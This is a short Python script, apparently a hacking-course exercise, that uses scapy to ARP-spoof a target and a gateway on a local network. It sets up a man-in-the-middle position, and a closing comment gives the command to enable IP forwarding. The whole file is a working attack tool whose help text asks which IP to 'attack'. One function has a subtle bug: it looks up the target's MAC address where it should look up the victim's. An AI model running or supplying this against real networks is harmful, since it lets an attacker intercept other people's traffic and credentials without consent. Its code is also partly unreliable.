#!/usr/bin/env python
import time
import scapy.all as scapy
import argparse
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",help="Please provide the ip address you would like to attack.")
    parser.add_argument("-gw", "--gateway", dest="gateway",help="Please provide the gateways ip address.")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target. Use --help for more information.")
    else:
        return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(victim_ip, spoof_ip):
    victim_mac = get_mac(target_ip)

                  #res ARP 1=req 2=res    victims ip      victims mac     routers ip    will make victims arp table think we are the router
    target_packet = scapy.ARP(op=2, pdst=victim_ip,hwdst=victim_mac, psrc=spoof_ip)
    scapy.send(target_packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose = False)

options=get_arguments()
target_ip=options.target
gateway_ip=options.gateway

try:
    sent_packets_count = 0
    while True:
                   #victims ip                  router ip
        spoof(target_ip, gateway_ip) # tells victims computer we are router
        spoof(gateway_ip, target_ip) # tells router we are victim
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent packets: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Quitting.... Happy Hacking:)\n[+] Restoring ARP Tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
#to run this make sure you allow packet forwarding using echo 1 > /proc/sys/net/ipv4/ip_forward, 0 to turn off